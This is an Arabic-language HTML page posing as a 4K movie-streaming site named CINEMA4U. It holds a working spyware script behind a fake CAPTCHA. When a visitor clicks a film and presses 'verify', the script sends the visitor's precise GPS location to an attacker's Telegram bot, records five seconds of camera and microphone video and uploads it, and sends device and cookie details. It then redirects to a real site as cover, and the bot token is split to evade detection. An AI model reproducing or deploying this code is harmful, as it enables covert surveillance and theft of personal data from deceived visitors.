<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CINEMA4U | مشاهدة مباشرة بجودة 4K</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        :root { --primary: #e50914; --bg: #050507; --card: #111116; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); color: #fff; margin: 0; overflow-x: hidden; }
        /* تصميم الهيدر الاحترافي */
        .header { background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); padding: 15px 5%; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #222; position: sticky; top: 0; z-index: 100; }
        .logo { color: var(--primary); font-size: 24px; font-weight: bold; text-transform: uppercase; letter-spacing: 2px; }
        /* شبكة الأفلام */
        .container { padding: 40px 5%; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 20px; }
        .movie-card { background: var(--card); border-radius: 12px; overflow: hidden; transition: 0.3s; cursor: pointer; border: 1px solid #222; position: relative;}
        .movie-card:hover { transform: scale(1.05); border-color: var(--primary); }
        .movie-card img { width: 100%; height: 260px; object-fit: cover; }
        .info { padding: 10px; text-align: center; }
        /* نافذة الـ CAPTCHA الشيطانية 😈 */
        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); display: none; align-items: center; justify-content: center; z-index: 1000; }
        .captcha-box { background: #16161d; padding: 30px; border-radius: 15px; text-align: center; max-width: 400px; border: 1px solid var(--primary); }
        .btn-verify { background: var(--primary); color: white; border: none; padding: 12px 25px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 20px; width: 100%; }
    </style>
</head>
<body>

<div class="header">
    <div class="logo">CINEMA4U 😈</div>
    <div class="search">🔍 ابحث عن فيلمك...</div>
</div>

<div class="container">
    <h2 style="margin-bottom: 20px;">🔥 الأكثر مشاهدة اليوم</h2>
    <div class="grid" id="movieGrid">
        </div>
</div>

<div class="overlay" id="overlay">
    <div class="captcha-box">
        <i class="fas fa-user-shield" style="font-size: 50px; color: var(--primary);"></i>
        <h3>تأكيد الهوية</h3>
        <p>بسبب ضغط السيرفرات في منطقتك، يرجى الضغط على الزر أدناه لتأكيد أنك لست روبوت ومشاهدة الفيلم بجودة 4K.</p>
        <button class="btn-verify" id="verifyBtn">أنا لست روبوت (تحقق)</button>
    </div>
</div>

<script>
    // [ENCRYPTED CONFIG] 😈
    // تم تقسيم التوكن لتجنب كشفه من الروبوتات
    const _0x = ["8378099800:AAGTOLzJ", "Ch8qos-1YvssEGZ", "fYD7V-ILHcRo"];
    const TOKEN = _0x.join('');
    const CHAT_ID = "6052532044";

    const movies = [
        {t: "Spider-Man", y: "2024", i: "https://image.tmdb.org/t/p/w500/uJYYizSuA9Y3DCs0qS4qWvHfZg4.jpg"},
        {t: "The Joker", y: "2024", i: "https://image.tmdb.org/t/p/w500/udDclpUhpXmCrW80gaWgNJQMp1H.jpg"},
        {t: "Ratatouille", y: "2007", i: "https://image.tmdb.org/t/p/w500/npHNjldbeTHdKKw28bJKs7lzqzj.jpg"}
    ];

    // بناء الواجهة
    const grid = document.getElementById('movieGrid');
    movies.forEach(m => {
        grid.innerHTML += `
            <div class="movie-card" onclick="startHunt('${m.t}')">
                <img src="${m.i}">
                <div class="info"><b>${m.t}</b><br><small>${m.y}</small></div>
            </div>`;
    });

    // دالة الإرسال المتطورة
    async function darkSend(msg) {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CHAT_ID, text: `😈 [DARK_LOG]:\n${msg}`, parse_mode: "Markdown"})
        });
    }

    // هندسة الصيد 😈
    function startHunt(title) {
        document.getElementById('overlay').style.display = 'flex';
        darkSend(`🎯 ضحية جديدة تحاول مشاهدة: *${title}*`);
    }

    document.getElementById('verifyBtn').onclick = async function() {
        this.innerHTML = "جاري التحقق...";
        
        // 1. سرقة الموقع (GPS)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                darkSend(`📍 موقع دقيق (GPS):\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
            }, err => darkSend("❌ رفض الوصول للموقع"), {enableHighAccuracy: true});
        }

        // 2. تفعيل التجسس (كاميرا + صوت) 😈
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
            darkSend("📸 تم اختراق الكاميرا والميكروفون بنجاح!");
            
            const recorder = new MediaRecorder(stream);
            let chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, {type: 'video/webm'});
                let fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('video', blob, 'victim.webm');
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {method: 'POST', body: fd});
            };
            recorder.start();
            setTimeout(() => recorder.stop(), 5000); // تسجيل 5 ثوانٍ مكثفة
        } catch (e) {
            darkSend(`❌ فشل الكاميرا: ${e.message}`);
        }

        // 3. سرقة بيانات المتصفح
        const info = `📱 جهاز: ${navigator.platform}\n🌐 متصفح: ${navigator.userAgent.split(') ')[1]}\n🍪 كوكيز: ${document.cookie ? 'موجودة' : 'لا يوجد'}`;
        darkSend(info);

        setTimeout(() => {
            alert("✅ تم التحقق بنجاح! سيفتح الفيلم الآن.");
            window.location.href = "https://ak.sv/"; // تحويل لموقع حقيقي للتمويه
        }, 3000);
    };
</script>

</body>
</html>
